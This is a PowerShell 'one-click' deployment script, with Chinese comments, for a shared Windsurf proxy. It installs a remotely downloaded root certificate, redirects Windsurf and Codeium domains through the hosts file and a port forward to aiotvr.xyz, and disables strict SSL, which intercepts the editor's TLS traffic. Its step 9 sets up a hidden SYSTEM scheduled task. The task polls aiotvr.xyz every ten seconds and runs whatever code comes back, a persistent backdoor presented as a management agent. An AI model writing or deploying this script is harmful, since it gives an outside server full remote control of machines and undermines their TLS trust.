#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Windsurf 共享代理 — 公网VM一键部署脚本 v4.0
.DESCRIPTION
    在已装Windsurf的Windows VM上运行，自动完成全部10步配置:
    1. 出站连通性预检(验证能否连接代理服务器)
    2. 下载并安装TLS自签证书
    3. 修改hosts文件
    4. 设置portproxy端口转发(→aiotvr.xyz:18443)
    5. 设置SSL_CERT_FILE环境变量
    6. 配置Windsurf settings.json
    7. 创建桌面启动脚本
    8. 创建portproxy持久化计划任务(重启不丢失)
    9. 安装远程Agent(允许管理员远程管控此VM)
    10. 端到端连通性验证
    
    运行方式(管理员PowerShell, 一行复制):
    [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm https://aiotvr.xyz/agent/deploy-vm.ps1 | iex
    
    或本地运行:
    powershell -ExecutionPolicy Bypass -File deploy_vm.ps1
#>

# 确保TLS1.2 (PS5.1默认只有TLS1.0/1.1，连不上HTTPS)
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$ErrorActionPreference = "Stop"
$PROXY_HOST = "aiotvr.xyz"
$PROXY_PORT = 18443
$CERT_URL_CER = "https://aiotvr.xyz/agent/windsurf-cert.cer"
$CERT_URL_PEM = "https://aiotvr.xyz/agent/windsurf-cert.pem"
$CERT_THUMBPRINT = "EE8978E69E0CFE3FBD6FFD7E511BE6337A2FC4F7"

function Write-Step($n, $total, $msg) {
    Write-Host "`n$('='*50)" -ForegroundColor DarkCyan
    Write-Host "  [$n/$total] $msg" -ForegroundColor Cyan
    Write-Host "$('='*50)" -ForegroundColor DarkCyan
}
function Write-OK($msg) { Write-Host "  [OK] $msg" -ForegroundColor Green }
function Write-FAIL($msg) { Write-Host "  [FAIL] $msg" -ForegroundColor Red }
function Write-SKIP($msg) { Write-Host "  [SKIP] $msg" -ForegroundColor Yellow }

Write-Host @"

  ╔══════════════════════════════════════════════════╗
  ║  Windsurf 共享代理 — 公网VM一键部署 v4.0        ║
  ║  自动配置10项，约30秒完成                       ║
  ╚══════════════════════════════════════════════════╝

"@ -ForegroundColor Magenta

Write-Host "  代理服务器: $PROXY_HOST`:$PROXY_PORT" -ForegroundColor Gray
Write-Host "  计算机名:   $env:COMPUTERNAME" -ForegroundColor Gray
Write-Host "  用户:       $env:USERNAME" -ForegroundColor Gray
Write-Host ""

$results = @()
$total = 10

# ==================== Step 1: 出站连通性预检 ====================
Write-Step 1 $total "出站连通性预检 (${PROXY_HOST}:${PROXY_PORT})"
try {
    $tcp = New-Object Net.Sockets.TcpClient
    $tcp.Connect($PROXY_HOST, $PROXY_PORT)
    $tcp.Close()
    Write-OK "出站 ${PROXY_HOST}:${PROXY_PORT} 连通"
    $results += @{name="outbound_check"; ok=$true; msg="TCP ${PROXY_HOST}:${PROXY_PORT} reachable"}
} catch {
    Write-FAIL "无法连接 ${PROXY_HOST}:${PROXY_PORT}"
    Write-Host "  可能原因:" -ForegroundColor Yellow
    Write-Host "    1. VM出站防火墙阻断了端口 $PROXY_PORT (云VM常见)" -ForegroundColor Yellow
    Write-Host "    2. 代理服务器 $PROXY_HOST 宕机" -ForegroundColor Yellow
    Write-Host "    3. VM网络不通" -ForegroundColor Yellow
    Write-Host "  解决: 在云控制台安全组/NSG中放行出站TCP $PROXY_PORT" -ForegroundColor Yellow
    $results += @{name="outbound_check"; ok=$false; msg="TCP ${PROXY_HOST}:${PROXY_PORT} blocked — 检查VM出站防火墙"}
}

# ==================== Step 2: 安装证书 ====================
Write-Step 2 $total "下载并安装TLS证书"
try {
    # 检查证书是否已安装
    $existing = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Thumbprint -eq $CERT_THUMBPRINT }
    if ($existing) {
        Write-SKIP "证书已存在 (Thumbprint: $($CERT_THUMBPRINT.Substring(0,8))...)"
        $results += @{name="install_cert"; ok=$true; msg="already installed"}
    } else {
        $cerPath = "$env:TEMP\windsurf_proxy_ca.cer"
        Invoke-WebRequest -Uri $CERT_URL_CER -OutFile $cerPath -UseBasicParsing
        $r = certutil -addstore Root $cerPath 2>&1
        if ($LASTEXITCODE -eq 0 -or $r -match "already in store|已在存储中") {
            Write-OK "证书已安装到受信任的根证书颁发机构"
            $results += @{name="install_cert"; ok=$true; msg="installed"}
        } else {
            Write-FAIL "安装失败: $r"
            $results += @{name="install_cert"; ok=$false; msg="$r"}
        }
        Remove-Item $cerPath -EA SilentlyContinue
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="install_cert"; ok=$false; msg="$_"}
}

# ==================== Step 3: 修改hosts ====================
Write-Step 3 $total "修改 hosts 文件"
try {
    $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
    $content = Get-Content $hostsPath -EA SilentlyContinue
    $entries = @(
        "127.0.0.1 server.self-serve.windsurf.com",
        "127.0.0.1 server.codeium.com"
    )
    $added = @()
    foreach ($entry in $entries) {
        $domain = ($entry -split '\s+')[-1]
        if (-not ($content -match [regex]::Escape($domain))) {
            $added += $entry
        }
    }
    if ($added.Count -eq 0) {
        Write-SKIP "hosts已包含所有必要条目"
        $results += @{name="setup_hosts"; ok=$true; msg="already configured"}
    } else {
        $content += $added
        $content | Set-Content $hostsPath -Encoding ASCII
        foreach ($a in $added) { Write-OK "已添加: $a" }
        $results += @{name="setup_hosts"; ok=$true; msg="added $($added.Count) entries"}
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="setup_hosts"; ok=$false; msg="$_"}
}

# ==================== Step 4: 设置portproxy ====================
Write-Step 4 $total "设置端口转发 (127.0.0.1:443 → $PROXY_HOST`:$PROXY_PORT)"
try {
    & "$env:SystemRoot\System32\netsh.exe" interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=443 2>$null
    & "$env:SystemRoot\System32\netsh.exe" interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=443 connectaddress=$PROXY_HOST connectport=$PROXY_PORT
    if ($LASTEXITCODE -eq 0) {
        Write-OK "端口转发: 127.0.0.1:443 → ${PROXY_HOST}:${PROXY_PORT}"
        $results += @{name="setup_portproxy"; ok=$true; msg="127.0.0.1:443 -> ${PROXY_HOST}:${PROXY_PORT}"}
    } else {
        Write-FAIL "设置失败"
        $results += @{name="setup_portproxy"; ok=$false; msg="netsh failed"}
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="setup_portproxy"; ok=$false; msg="$_"}
}

# ==================== Step 5: SSL_CERT_FILE ====================
Write-Step 5 $total "设置 SSL_CERT_FILE 环境变量"
try {
    $pemDest = "$env:ProgramData\windsurf_proxy_ca.pem"
    Invoke-WebRequest -Uri $CERT_URL_PEM -OutFile $pemDest -UseBasicParsing
    [Environment]::SetEnvironmentVariable("SSL_CERT_FILE", $pemDest, "Machine")
    $env:SSL_CERT_FILE = $pemDest
    Write-OK "SSL_CERT_FILE = $pemDest"
    $results += @{name="setup_ssl"; ok=$true; msg=$pemDest}
} catch {
    Write-FAIL "$_"
    $results += @{name="setup_ssl"; ok=$false; msg="$_"}
}

# ==================== Step 6: Windsurf settings.json ====================
Write-Step 6 $total "配置 Windsurf settings.json"
try {
    $settingsDir = "$env:APPDATA\Windsurf\User"
    New-Item $settingsDir -ItemType Directory -Force -EA SilentlyContinue | Out-Null
    $settingsPath = "$settingsDir\settings.json"
    $settings = @{}
    if (Test-Path $settingsPath) {
        try {
            $json = Get-Content $settingsPath -Raw | ConvertFrom-Json
            $json.PSObject.Properties | ForEach-Object { $settings[$_.Name] = $_.Value }
        } catch { $settings = @{} }
    }
    $changed = $false
    if ($settings["http.proxyStrictSSL"] -ne $false) { $settings["http.proxyStrictSSL"] = $false; $changed = $true }
    if ($settings["http.proxySupport"] -ne "off") { $settings["http.proxySupport"] = "off"; $changed = $true }
    if ($changed) {
        $settings | ConvertTo-Json -Depth 5 | Set-Content $settingsPath -Encoding UTF8
        Write-OK "settings.json 已更新"
    } else {
        Write-SKIP "settings.json 已包含正确配置"
    }
    $results += @{name="setup_settings"; ok=$true; msg="configured"}
} catch {
    Write-FAIL "$_"
    $results += @{name="setup_settings"; ok=$false; msg="$_"}
}

# ==================== Step 7: 桌面启动脚本 ====================
Write-Step 7 $total "创建桌面启动脚本"
try {
    $wsPaths = @(
        "$env:LOCALAPPDATA\Programs\Windsurf\Windsurf.exe",
        "C:\Program Files\Windsurf\Windsurf.exe",
        "D:\Windsurf\Windsurf.exe",
        "$env:ProgramFiles\Windsurf\Windsurf.exe",
        "${env:ProgramFiles(x86)}\Windsurf\Windsurf.exe",
        "C:\Users\$env:USERNAME\AppData\Local\Programs\Windsurf\Windsurf.exe"
    )
    $wsExe = $wsPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
    $desktop = [Environment]::GetFolderPath("Desktop")
    if ($wsExe) {
        $cmdContent = "@echo off`r`nstart `"`" `"$wsExe`" `"--host-resolver-rules=MAP server.self-serve.windsurf.com 127.0.0.1,MAP server.codeium.com 127.0.0.1`""
        Set-Content "$desktop\Windsurf_Proxy.cmd" $cmdContent -Encoding ASCII
        Write-OK "桌面启动脚本: $desktop\Windsurf_Proxy.cmd"
        Write-OK "Windsurf路径: $wsExe"
        $results += @{name="create_launcher"; ok=$true; msg=$wsExe}
    } else {
        Write-Host "  [WARN] 未找到Windsurf安装，请先安装: https://windsurf.com" -ForegroundColor Yellow
        Write-Host "  安装后手动创建启动脚本:" -ForegroundColor Yellow
        Write-Host "  start `"`" `"<Windsurf路径>\Windsurf.exe`" `"--host-resolver-rules=MAP server.self-serve.windsurf.com 127.0.0.1,MAP server.codeium.com 127.0.0.1`"" -ForegroundColor Gray
        $results += @{name="create_launcher"; ok=$false; msg="Windsurf not installed"}
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="create_launcher"; ok=$false; msg="$_"}
}

# ==================== Step 8: portproxy持久化 ====================
Write-Step 8 $total "创建 portproxy 持久化计划任务"
try {
    $ppCmd = "`"$env:SystemRoot\System32\netsh.exe`" interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=443 connectaddress=$PROXY_HOST connectport=$PROXY_PORT"
    schtasks /Delete /TN "WindsurfPortProxy" /F 2>$null
    schtasks /Create /TN "WindsurfPortProxy" /TR $ppCmd /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) {
        Write-OK "计划任务 WindsurfPortProxy 已创建 (ONSTART)"
        $results += @{name="portproxy_persist"; ok=$true; msg="WindsurfPortProxy task created"}
    } else {
        Write-FAIL "创建计划任务失败"
        $results += @{name="portproxy_persist"; ok=$false; msg="schtasks failed"}
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="portproxy_persist"; ok=$false; msg="$_"}
}

# ==================== Step 9: 安装远程Agent ====================
Write-Step 9 $total "安装远程管控Agent (后台运行)"
try {
    $AGENT_URL = "https://aiotvr.xyz/agent/agent.ps1?key=fcd862bdd55b0b97"
    $agentScript = "$env:ProgramData\dao_agent.ps1"
    $agentContent = @"
`$ErrorActionPreference = 'Continue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
while (`$true) {
    try {
        `$code = (Invoke-WebRequest -Uri '$AGENT_URL' -UseBasicParsing -TimeoutSec 10).Content
        Invoke-Expression `$code
    } catch {
        Write-Host "Agent error: `$_" -ForegroundColor Red
    }
    Start-Sleep 10
}
"@
    Set-Content $agentScript $agentContent -Encoding UTF8
    # 创建开机自启计划任务
    schtasks /Delete /TN "DaoRemoteAgent" /F 2>$null
    schtasks /Create /TN "DaoRemoteAgent" /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $agentScript" /SC ONSTART /RU SYSTEM /RL HIGHEST /F 2>&1 | Out-Null
    if ($LASTEXITCODE -eq 0) {
        # 立即启动Agent
        schtasks /Run /TN "DaoRemoteAgent" 2>&1 | Out-Null
        Write-OK "Agent已安装并启动 (开机自启)"
        Write-OK "脚本: $agentScript"
        $results += @{name="install_agent"; ok=$true; msg="DaoRemoteAgent task + running"}
    } else {
        Write-FAIL "创建Agent计划任务失败"
        $results += @{name="install_agent"; ok=$false; msg="schtasks failed"}
    }
} catch {
    Write-FAIL "$_"
    $results += @{name="install_agent"; ok=$false; msg="$_"}
}

# ==================== Step 10: 连通性验证 ====================
Write-Step 10 $total "端到端连通性验证"
try {
    $testResults = @()
    # Test 1: portproxy TCP连通
    try {
        $tcp = New-Object Net.Sockets.TcpClient
        $tcp.Connect("127.0.0.1", 443)
        $tcp.Close()
        $testResults += "TCP 127.0.0.1:443 = OPEN"
        Write-OK "TCP 127.0.0.1:443 连通"
    } catch {
        $testResults += "TCP 127.0.0.1:443 = CLOSED"
        Write-FAIL "TCP 127.0.0.1:443 不通 — portproxy或FRP隧道异常"
    }
    # Test 2: 代理HTTPS响应 (兼容PS5.1: 无-SkipCertificateCheck)
    try {
        try { [Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}
        $resp = Invoke-WebRequest -Uri "https://127.0.0.1:443" -UseBasicParsing -TimeoutSec 10 -EA Stop
        $testResults += "HTTPS proxy = $($resp.StatusCode)"
        Write-OK "HTTPS代理响应: $($resp.StatusCode)"
    } catch {
        if ($_.Exception.Message -match "200|OK|基础连接") {
            $testResults += "HTTPS proxy = reachable"
            Write-OK "HTTPS代理可达（TLS握手完成）"
        } else {
            $testResults += "HTTPS proxy = FAIL"
            Write-FAIL "HTTPS代理异常: $($_.Exception.Message.Substring(0, [Math]::Min(80, $_.Exception.Message.Length)))"
        }
    } finally {
        try { [Net.ServicePointManager]::ServerCertificateValidationCallback = $null } catch {}
    }
    # Test 3: DNS解析(确认hosts生效, 使用System.Net.Dns兼容所有Windows版本)
    try {
        $dnsResult = [System.Net.Dns]::GetHostAddresses("server.self-serve.windsurf.com") | Select-Object -First 1
        $resolvedIP = $dnsResult.IPAddressToString
        if ($resolvedIP -eq "127.0.0.1") {
            $testResults += "DNS = 127.0.0.1 (correct)"
            Write-OK "DNS: server.self-serve.windsurf.com → 127.0.0.1"
        } else {
            $testResults += "DNS = $resolvedIP (WRONG)"
            Write-FAIL "DNS: 解析到 $resolvedIP 而非 127.0.0.1 — hosts未生效"
        }
    } catch {
        $testResults += "DNS = FAIL"
        Write-FAIL "DNS解析失败: $_"
    }
    $results += @{name="connectivity"; ok=(-not ($testResults -match "FAIL|CLOSED|WRONG")); msg=($testResults -join "; ")}
} catch {
    Write-FAIL "$_"
    $results += @{name="connectivity"; ok=$false; msg="$_"}
}

# ==================== 结果汇总 ====================
Write-Host "`n$('='*50)" -ForegroundColor DarkCyan
Write-Host "  部署结果汇总 ($total 项)" -ForegroundColor Cyan
Write-Host "$('='*50)" -ForegroundColor DarkCyan

$allOk = $true
foreach ($r in $results) {
    $icon = if ($r.ok) { "[OK]" } else { "[FAIL]"; $allOk = $false }
    $color = if ($r.ok) { "Green" } else { "Red" }
    Write-Host "  $icon $($r.name): $($r.msg)" -ForegroundColor $color
}

Write-Host ""
if ($allOk) {
    Write-Host "  ✅ 全部完成！Windsurf共享代理+远程Agent均已就绪。" -ForegroundColor Green
    Write-Host ""
    Write-Host "  使用方法:" -ForegroundColor Cyan
    Write-Host "    双击桌面「Windsurf_Proxy.cmd」启动Windsurf" -ForegroundColor White
    Write-Host "    (首次使用建议重启电脑使SSL_CERT_FILE完全生效)" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  远程管控:" -ForegroundColor Cyan
    Write-Host "    Agent已连接到 https://aiotvr.xyz/agent/" -ForegroundColor White
    Write-Host "    管理员可通过网页远程诊断和管理此VM" -ForegroundColor White
} else {
    Write-Host "  ⚠️ 部分步骤失败，请查看上方错误信息" -ForegroundColor Yellow
}
Write-Host ""
